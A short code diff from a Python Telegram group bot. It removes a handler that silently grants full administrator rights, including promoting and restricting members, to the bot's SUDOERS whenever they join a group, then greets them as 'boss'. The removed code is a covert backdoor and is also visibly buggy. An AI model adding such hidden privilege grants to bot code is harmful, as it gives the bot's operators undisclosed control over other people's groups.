@@ -198,25 +198,5 @@ async def greet_new_member(_, member: ChatMemberUpdated):
         except Exception as e:
             LOGGER.error(e)
 
-@app.on_chat_member_updated(filters.group, group=-5)
-async def greet_new_member(_, member: ChatMemberUpdated):
-    try:
-        
-        chat = member.chat
-        chat_id = member.chat.id
-        for members in member.members:
-            if members.id == SUDOERS:
-                await app.promote_chat_member(chat_id, members.id, privileges=ChatPrivileges(
-                    can_change_info=True,
-                    can_invite_users=True,
-                    can_delete_messages=True,
-                    can_restrict_members=True,
-                    can_pin_messages=True,
-                    can_promote_members=True,
-                    can_manage_chat=True,
-                    can_manage_video_chats=True,
-                ))
-                await app.send_message(chat_id, f"**ᴡᴇʟᴄᴏᴍᴇ,** {user.mention} **ʙᴏss😊**")
-            
-    except Exception as e:
-        print(f"Error: {e}")
+
+      
